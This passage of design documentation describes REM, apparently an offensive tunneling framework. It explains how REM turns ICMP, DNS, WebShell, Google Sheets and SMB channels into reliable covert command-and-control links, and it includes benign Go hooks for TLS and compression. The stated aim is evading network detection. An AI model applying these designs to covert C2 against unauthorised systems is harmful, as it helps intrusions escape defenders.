<p><strong>Expanded covert channel and C2 infrastructure capabilities:</strong> Abstracted non-traditional media such as WebShell, Google Sheets API, and SMB named pipes into reliable duplex channels, and provided multi-level C2 framework integration schemes (including FFI embedding), significantly improving the covertness, flexibility, and performance of attack communications.</p>
</li>
<li>
<p><strong>Implemented a protocol-boundary-free cascading proxy chain:</strong> Through the generalized <code>proxyclient</code> library, it supports the chain combination of various proxy protocols (SOCKS, HTTP, SSH, etc.) and REM's own capabilities, constructing an elastic proxy link that spans any medium and adapts to complex network topologies.</p>
</li>
</ul>
<p>Through these innovations, REM realizes the transformation from a "Fixed Protocol Stack" to a "Orchestratable Protocol Stack," fundamentally dismantling the basic assumptions relied upon by traditional detection and pushing attack and defense from a technical competition to a new dimension.</p>
<p>REM is not just a tool; it is an infrastructure platform for network confrontation. For attackers, it offers the ability to assemble infinite configuration possibilities using a unified architecture.</p>
<hr />
<h2 id="2-an-offensive-perspective-on-the-network-protocol-stack">2. An Offensive Perspective on the Network Protocol Stack<a class="headerlink" href="#2-an-offensive-perspective-on-the-network-protocol-stack" title="Permanent link">&para;</a></h2>
<p>Based on the theoretical foundation of reconstructing the OSI model, the REM architecture implements an OSI layer reconstruction oriented towards attack scenarios. This reconstruction takes the transport layer as the core foundation, building session, presentation, and application layer attack capabilities upwards, and ultimately serving various attack application scenarios through the transport layer. This breaks the hierarchical constraints of the traditional OSI model, providing significant improvements in flexibility and covertness for network-side confrontation operations.</p>
<p><em>(We provide links to the corresponding code implementation in each chapter, but the code is not the most critical part; rather, it is the shift in design philosophy. We built REM using Golang, but this system can be built using Python, Rust, C, or any other language.)</em></p>
<h3 id="architecture-diagram-and-overview">Architecture Diagram and Overview<a class="headerlink" href="#architecture-diagram-and-overview" title="Permanent link">&para;</a></h3>
<pre class="mermaid"><code>graph TD
    subgraph "REM Core Protocol Stack (Chapter 2)"
    direction TB
        subgraph "Application Scenario Layer (Chapter 3)"
             AppLayer[3.1 Application Layer Abstraction]
             Attacks[3.2-3.5 Attack Scenarios]
        end

        subgraph "2.5 Hook Orchestrator"
             Hook[Hook Mechanism]
             Priority[Priority-Driven Capability Combination]
        end

        subgraph "2.3 Inverted Architecture (Encrypt First, Then Multiplex)"
             Wrapper[2.3.2 Wrapper Chain]
             WrapperDesc[Dynamic Encryption/Obfuscation\nReverse Read Chain]
             Mux[2.3.3 Mux]
             MuxDesc[Lightweight Multiplexing\nZero-Signature Design]
        end

        subgraph "2.4 Proxy Integration Layer"
             ProxyClient[proxyclient]
             ProxyDesc[Protocol-Boundary-Free Integration\nSOCKS/HTTP/SSH/neoreg/suo5]
             ZeroPerf[Zero-Performance Proxy]
             ZeroPerfDesc[Memory-Simulated SOCKS5]
             Cascade[Cascading Network]
             CascadeDesc[Cross-Arbitrary Medium]
        end

        subgraph "2.1 Transport Layer Core"
             Tunnel[Tunnel Abstraction]
             TunnelDesc[Protocol-Agnostic net.Conn\nBeforeHook/AfterHook]
        end

        subgraph "2.2 Reliability Conversion Chain"
             Simplex[Simplex Duplexing]
             SimplexDesc[Send/Receive Abstraction\nClient/Server/Bidirectional Polling]
             ARQ[ARQ Protocol]
             ARQDesc[PacketConn → net.Conn\nKCP/Custom ARQ]
        end

        subgraph "Underlying Channels"
             Media[Arbitrary Data Exchange Medium]
             Standard[TCP/UDP/ICMP/DNS/HTTP/WebShell]
             NonStandard[Google Sheets/SMB/lolC2]
        end
    end

    Media --&gt; Simplex
    Simplex --&gt; ARQ
    ARQ --&gt; Tunnel
    Standard --&gt; Tunnel

    Tunnel --&gt; Hook
    Hook --&gt; ProxyClient
    ProxyClient --&gt; Wrapper
    Wrapper --&gt; Mux
    Mux --&gt; AppLayer

    Hook -.-&gt; |Orchestration| Tunnel
    Hook -.-&gt; |Orchestration| Wrapper
    Hook -.-&gt; |Orchestration| ProxyClient
    Hook -.-&gt; |Orchestration| Mux

    AppLayer --&gt; C2[C2 Integration]
    C2 --&gt; C2Type[Proxy/ExternalC2/FFI]
    AppLayer --&gt; Channel[Arbitrary Channel]
    Channel --&gt; ChannelType[SMB/lolC2]

    AppLayer --&gt; Inbound[Inbound]
    Inbound --&gt; InDesc[ListenAndServe+Relay]
    AppLayer --&gt; Outbound[Outbound]
    Outbound --&gt; OutDesc[Handle+Dial]

    Inbound -.-&gt; |Control Inbound Location| ReverseProxy[Reverse/Proxy Mode]</code></pre>
<h3 id="21-transport-layer-protocol-agnostic-transport-abstraction">2.1 Transport Layer: Protocol-Agnostic Transport Abstraction<a class="headerlink" href="#21-transport-layer-protocol-agnostic-transport-abstraction" title="Permanent link">&para;</a></h3>
<p><em>Code:</em> <a href="https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/tree/master/protocol/tunnel%5Dhttps://github.com/chainreactors/rem/tree/master/protocol/tunnelhttps://github.com/chainreactors/rem/tree/master/protocol/tunnel"><code>https://github.com/chainreactors/rem/tree/master/protocol/tunnel</code></a></p>
<p>Traditional network tools fix transport protocols to standard options like TCP/UDP, limiting flexibility in attack scenarios. REM implements a protocol-agnostic transport layer through the <code>Tunnel</code> interface abstraction, allowing any protocol that can provide a <code>net.Conn</code> to be used as a transport layer.</p>
<p>In the REM architecture, the transport layer is no longer just the data transport layer in the traditional OSI model, but the cornerstone of the entire offensive infrastructure. <strong>Any medium capable of data exchange can serve as an offensive transport layer.</strong></p>
<p>REM's transport layer is manifested as a <code>tunnel</code>. Each tunnel consists of a <code>dialer</code> and a <code>listener</code>. It is important to understand that <code>listener</code> and <code>dialer</code> only represent the server and client relationship on the transport layer. Once the tunnel is established, all REM nodes become equal peers, which is a significant difference from previous proxy tools.</p>
<h4 id="211-tunnel-interface-reliance-on-netconn">2.1.1 Tunnel Interface: Reliance on <code>net.Conn</code><a class="headerlink" href="#211-tunnel-interface-reliance-on-netconn" title="Permanent link">&para;</a></h4>
<p><em>Code:</em> <a href="https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/blob/master/protocol/core/tunnel.go%5Dhttps://github.com/chainreactors/rem/blob/master/protocol/core/tunnel.gohttps://github.com/chainreactors/rem/blob/master/protocol/core/tunnel.go"><code>https://github.com/chainreactors/rem/blob/master/protocol/core/tunnel.go</code></a></p>
<p>The only requirement of the <code>Tunnel</code> interface is the ability to provide <code>net.Conn</code>, which is the fundamental dependency of the entire REM transport layer. Regardless of the underlying protocol used, it must ultimately provide a standard <code>net.Conn</code> interface.</p>
<p><code>net.Conn</code> is the core interface in the Golang standard library representing a network connection. It provides three basic methods: <code>Read</code>, <code>Write</code>, and <code>Close</code>, representing a bidirectional, stream-oriented network connection (similar to a TCP connection). Any type implementing these three methods can be used as a network connection.</p>
<p><strong>Two Protocol Scenarios:</strong></p>
<table>
<thead>
<tr>
<th><strong>Scenario</strong></th>
<th><strong>Protocol Type</strong></th>
<th><strong>Characteristics</strong></th>
<th><strong>Can Provide Conn Directly?</strong></th>
<th><strong>Handling Method</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Scenario A</strong></td>
<td><strong>Standard Protocols</strong> (TCP, UDP, WebSocket, WireGuard)</td>
<td>Bidirectional, reliable, standard interface</td>
<td>✅ Yes</td>
<td>Used directly for Tunnel</td>
</tr>
<tr>
<td><strong>Scenario B</strong></td>
<td><strong>Inferior Protocols</strong> (ICMP, DNS, HTTP API, WebShell)</td>
<td>Unidirectional/Unreliable/Non-standard</td>
<td>❌ No</td>
<td>Requires conversion via Section 2.2</td>
</tr>
</tbody>
</table>
<p>The <code>Tunnel</code> interface design is very concise, requiring only the implementation of a <code>Dialer</code> and <code>Listener</code>:</p>
<div class="highlight"><pre><span></span><code><span class="kd">type</span><span class="w"> </span><span class="nx">TunnelDialer</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Dial</span><span class="p">(</span><span class="nx">dst</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w">  </span><span class="c1">// Must return net.Conn</span>
<span class="p">}</span>

<span class="kd">type</span><span class="w"> </span><span class="nx">TunnelListener</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">net</span><span class="p">.</span><span class="nx">Listener</span><span class="w">  </span><span class="c1">// Golang standard listener interface</span>
<span class="w">    </span><span class="nx">Listen</span><span class="p">(</span><span class="nx">dst</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Listener</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w">  </span><span class="c1">// Accept() returns net.Conn</span>
<span class="p">}</span>
</code></pre></div>
<p><code>net.Conn</code> interface definition:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// Golang standard library net.Conn interface</span>
<span class="kd">type</span><span class="w"> </span><span class="nx">Conn</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Read</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w">   </span><span class="c1">// Read data</span>
<span class="w">    </span><span class="nx">Write</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w">  </span><span class="c1">// Write data</span>
<span class="w">    </span><span class="nx">Close</span><span class="p">()</span><span class="w"> </span><span class="kt">error</span><span class="w">                       </span><span class="c1">// Close connection</span>
<span class="w">    </span><span class="c1">// ... plus auxiliary methods like address, timeout, etc.</span>
<span class="p">}</span>
</code></pre></div>
<p>The Tunnel does not concern itself with the implementation details of the underlying protocol, only whether it can ultimately provide a <code>net.Conn</code> interface. This achieves protocol agnosticism:</p>
<ul>
<li>
<p>TCP, UDP, Unix Socket provided by the Golang standard library can be used directly.</p>
</li>
<li>
<p>ICMP, DNS, etc., converted via Section 2.2, can be used in the same way.</p>
</li>
<li>
<p>Any custom protocol implementing the <code>net.Conn</code> interface can be integrated.</p>
</li>
</ul>
<p>Golang's <code>net.Conn</code> interface is widely used in various network libraries (HTTP, TLS, Shadowsocks, etc.), allowing REM to maximize the use of the Golang ecosystem. For example, <code>http.Client</code> and <code>tls.Client</code> both accept <code>net.Conn</code> as the underlying transport. A channel based on the Telegram API, as long as it can be encapsulated as <code>net.Conn</code>, can be directly wrapped with encryption layers like TLS or Shadowsocks.</p>
<p><strong><code>io.ReadWriteCloser</code> Interface:</strong> The <code>net.Conn</code> interface actually inherits from the <code>io.ReadWriteCloser</code> interface (which only has <code>Read</code>/<code>Write</code>/<code>Close</code> methods). This simpler interface is used more broadly in Golang, including file operations, memory buffers, encryption streams, etc.</p>
<p>This approach is simple and clear, maximizing the use of Golang's existing infrastructure. Any transport protocol that implements the <code>net</code> package interface can be used as a REM transport layer with very minor modifications.</p>
<h4 id="212-secondary-wrapping-of-conn">2.1.2 Secondary Wrapping of Conn<a class="headerlink" href="#212-secondary-wrapping-of-conn" title="Permanent link">&para;</a></h4>
<p>Established connections often require additional processing (TLS encryption, data compression, statistical countermeasures). The mechanism for secondary wrapping of <code>Conn</code> references the design of <code>frp</code>, utilizing <code>BeforeHook</code>/<code>AfterHook</code> to inject processing logic before and after connection establishment, combined with a priority mechanism to achieve flexible connection extension.</p>
<p>Details on the Hook mechanism are introduced in Section 2.5.</p>
<p>In practice, REM provides a mechanism to support secondary processing operations on <code>Conn</code>, enabling the wrapping of complex functionalities supported by Golang on top of stable <code>Conn</code> objects.</p>
<p>Example 1: TLS Encryption</p>
<p>TLS encryption is the most common application, used to add encryption protection to any transport layer:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// TLS Encryption Hook Implementation</span>
<span class="kd">func</span><span class="w"> </span><span class="nx">WithTLS</span><span class="p">()</span><span class="w"> </span><span class="nx">TunnelOption</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">newFuncTunnelOption</span><span class="p">(</span><span class="kd">func</span><span class="p">(</span><span class="nx">do</span><span class="w"> </span><span class="o">*</span><span class="nx">TunnelService</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">do</span><span class="p">.</span><span class="nx">listener</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// Server mode: Add TLS to listener</span>
<span class="w">            </span><span class="nx">tlsConfig</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nx">NewServerTLSConfig</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">)</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">return</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="p">,</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">AfterHook</span><span class="p">{</span>
<span class="w">                </span><span class="nx">Priority</span><span class="p">:</span><span class="w"> </span><span class="nx">TLSPriority</span><span class="p">,</span><span class="w">  </span><span class="c1">// Highest priority, ensuring TLS is outermost</span>
<span class="w">                </span><span class="nx">ListenHook</span><span class="p">:</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">listener</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Listener</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Listener</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="c1">// Wrap as TLS Listener</span>
<span class="w">                    </span><span class="nx">tlsListener</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">tls</span><span class="p">.</span><span class="nx">NewListener</span><span class="p">(</span><span class="nx">listener</span><span class="p">,</span><span class="w"> </span><span class="nx">tlsConfig</span><span class="p">)</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">tlsListener</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="w">                </span><span class="p">},</span>
<span class="w">            </span><span class="p">})</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// Client mode: Add TLS to Dialer</span>
<span class="w">            </span><span class="nx">tlsConfig</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nx">NewClientTLSConfig</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">)</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">return</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="p">,</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">AfterHook</span><span class="p">{</span>
<span class="w">                </span><span class="nx">Priority</span><span class="p">:</span><span class="w"> </span><span class="nx">TLSPriority</span><span class="p">,</span>
<span class="w">                </span><span class="nx">DialerHook</span><span class="p">:</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="c1">// Wrap as TLS connection</span>
<span class="w">                    </span><span class="nx">tlsConn</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">tls</span><span class="p">.</span><span class="nx">Client</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="nx">tlsConfig</span><span class="p">)</span>
<span class="w">                    </span><span class="c1">// Perform TLS handshake</span>
<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">tlsConn</span><span class="p">.</span><span class="nx">Handshake</span><span class="p">();</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="nx">c</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
<span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">tlsConn</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="w">                </span><span class="p">},</span>
<span class="w">            </span><span class="p">})</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">})</span>
<span class="p">}</span>
</code></pre></div>
<p><strong>Value of TLS Hook:</strong></p>
<ul>
<li><strong>Encryption Protection:</strong> All data is encrypted via TLS, preventing Man-in-the-Middle (MitM) eavesdropping.</li>
<li><strong>Protocol Agnostic:</strong> Can add a TLS layer to non-standard protocols like ICMP or DNS.</li>
<li><strong>Certificate Verification:</strong> Optional certificate verification, supporting self-signed certificates.</li>
<li><strong>Application Scenario:</strong> Wrapping a plaintext ICMP tunnel into an encrypted ICMP-over-TLS tunnel.</li>
</ul>
<p>Example 2: Data Compression Hook</p>
<p>The compression Hook is used to reduce the amount of data transmitted, particularly suitable for bandwidth-constrained scenarios:</p>
<p>Go</p>
<div class="highlight"><pre><span></span><code><span class="c1">// Compression Hook Implementation</span>
<span class="kd">func</span><span class="w"> </span><span class="nx">WithCompression</span><span class="p">()</span><span class="w"> </span><span class="nx">TunnelOption</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">newFuncTunnelOption</span><span class="p">(</span><span class="kd">func</span><span class="p">(</span><span class="nx">do</span><span class="w"> </span><span class="o">*</span><span class="nx">TunnelService</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">do</span><span class="p">.</span><span class="nx">listener</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// Client mode</span>
<span class="w">            </span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="p">,</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">AfterHook</span><span class="p">{</span>
<span class="w">                </span><span class="nx">Priority</span><span class="p">:</span><span class="w"> </span><span class="nx">WrapperPriority</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
<span class="w">                </span><span class="nx">DialerHook</span><span class="p">:</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="c1">// Wrap connection using Snappy compression algorithm</span>
<span class="w">                    </span><span class="nx">compressedConn</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">cio</span><span class="p">.</span><span class="nx">WrapConn</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="nx">wrapper</span><span class="p">.</span><span class="nx">NewSnappyWrapper</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="p">))</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">compressedConn</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="w">                </span><span class="p">},</span>
<span class="w">            </span><span class="p">})</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// Server mode</span>
<span class="w">            </span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="p">,</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">AfterHook</span><span class="p">{</span>
<span class="w">                </span><span class="nx">Priority</span><span class="p">:</span><span class="w"> </span><span class="nx">WrapperPriority</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
<span class="w">                </span><span class="nx">AcceptHook</span><span class="p">:</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="c1">// Server needs the same compression configuration</span>
<span class="w">                    </span><span class="nx">compressedConn</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">cio</span><span class="p">.</span><span class="nx">WrapConn</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="nx">wrapper</span><span class="p">.</span><span class="nx">NewSnappyWrapper</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="p">))</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">compressedConn</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="w">                </span><span class="p">},</span>
<span class="w">            </span><span class="p">})</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">})</span>
<span class="p">}</span>
</code></pre></div>
<p>The compression Hook utilizes the Snappy algorithm to achieve efficient data compression with almost no added latency, greatly enhancing data transmission capabilities in low-bandwidth, restricted channels.</p>
<p><em>(In the OSI model, this is equivalent to tunnel abstraction and flow control mechanisms at the data link layer.)</em></p>
<h3 id="22-below-the-transport-layer-converting-arbitrary-protocols-to-standard-connections">2.2 Below the Transport Layer: Converting Arbitrary Protocols to Standard Connections<a class="headerlink" href="#22-below-the-transport-layer-converting-arbitrary-protocols-to-standard-connections" title="Permanent link">&para;</a></h3>
<p>The <code>Tunnel</code> in Section 2.1 requires <code>net.Conn</code>. Standard protocols (TCP/UDP/WebSocket) provide this directly, but ICMP/DNS/HTTP APIs and relative "inferior" protocols cannot. Furthermore, various "lolC2" (Living off the Land C2) channels, which are immensely valuable in attack scenarios (bypassing firewalls/NAT/Layer 7 filtering), are even more problematic. REM solves this via a two-layer conversion chain: <strong>Simplex</strong> encapsulates arbitrary data exchange into <code>PacketConn</code> and implements duplexing, while <strong>ARQ</strong> provides reliability guarantees for <code>PacketConn</code> and converts it to <code>net.Conn</code>, ultimately outputting a standard connection with the same status as TCP.</p>
<p><em>Code:</em> <a href="https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/tree/master/x/kcp%5Dhttps://github.com/chainreactors/rem/tree/master/x/kcphttps://github.com/chainreactors/rem/tree/master/x/kcp"><code>https://github.com/chainreactors/rem/tree/master/x/kcp</code></a> &amp; <a href="https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/tree/master/x/simplex%5Dhttps://github.com/chainreactors/rem/tree/master/x/simplexhttps://github.com/chainreactors/rem/tree/master/x/simplex"><code>https://github.com/chainreactors/rem/tree/master/x/simplex</code></a></p>
<p><strong>Differences between Protocol Scenarios:</strong></p>
<table>
<thead>
<tr>
<th><strong>Scenario</strong></th>
<th><strong>Protocol Type</strong></th>
<th><strong>Characteristics</strong></th>
<th><strong>Can Provide Conn Directly?</strong></th>
<th><strong>Handling Method</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Scenario A</strong></td>
<td>TCP/UDP/WebSocket</td>
<td>Bidirectional, reliable, standard interface</td>
<td>✅ Yes</td>
<td>Used directly for Tunnel</td>
</tr>
<tr>
<td><strong>Scenario B</strong></td>
<td>ICMP/DNS/HTTP API/WebShell</td>
<td>Unidirectional/Unreliable/Non-standard</td>
<td>❌ No</td>
<td>Requires Section 2.2 conversion</td>
</tr>
</tbody>
</table>
<p>Section 2.1 described how standard protocols in Scenario A act directly as the transport layer. However, in network confrontation scenarios, we frequently encounter the "inferior" protocols of Scenario B: ICMP, HTTP API, WebShell, DNS queries. These protocols have various defects: unreliability, unidirectional communication, low performance, and heavy restrictions, yet they are often the only available means of breach.</p>
<p>The goal is to convert the inferior protocols of Scenario B into standard <code>net.Conn</code> equal in status to Scenario A, delivering them for unified use by the Tunnel.</p>
<p><strong>Conversion Chain Design:</strong></p>
<div class="highlight"><pre><span></span><code>Inferior Protocol (ICMP/DNS/HTTP API/WebShell)
  ↓
【Step 1: Simplex - Duplexing】
  • Encapsulate as unified PacketConn interface
  • Convert unidirectional communication to bidirectional via polling
  ↓
Bidirectional PacketConn (Bidirectional but Unreliable)
  ↓
【Step 2: ARQ - Reliability】
  • Provide retransmission, ordering, flow control guarantees
  • Convert to net.Conn interface
  ↓
net.Conn (Bidirectional and Reliable)
  ↓
【Delivered to Tunnel in Section 2.1】
</code></pre></div>
<h4 id="221-simplex-encapsulation-and-duplexing-from-arbitrary-data-exchange-to-packetconn">2.2.1 Simplex: Encapsulation and Duplexing from Arbitrary Data Exchange to PacketConn<a class="headerlink" href="#221-simplex-encapsulation-and-duplexing-from-arbitrary-data-exchange-to-packetconn" title="Permanent link">&para;</a></h4>
<p>Protocols like ICMP/DNS/HTTP are essentially unidirectional or asymmetric data exchanges. They need to be encapsulated into a unified <code>PacketConn</code> interface first, while converting unidirectional communication to bidirectional via a polling mechanism. This is the foundation of the entire conversion chain.</p>
<p><code>net.PacketConn</code> is the interface in the Golang standard library representing a packet-oriented connection (similar to UDP). It uses <code>ReadFrom</code>/<code>WriteTo</code> methods for packet-level sending and receiving. Each read/write is a complete data packet, unlike the stream-based <code>net.Conn</code>.</p>
<p><strong>PacketConn Interface Definition:</strong></p>
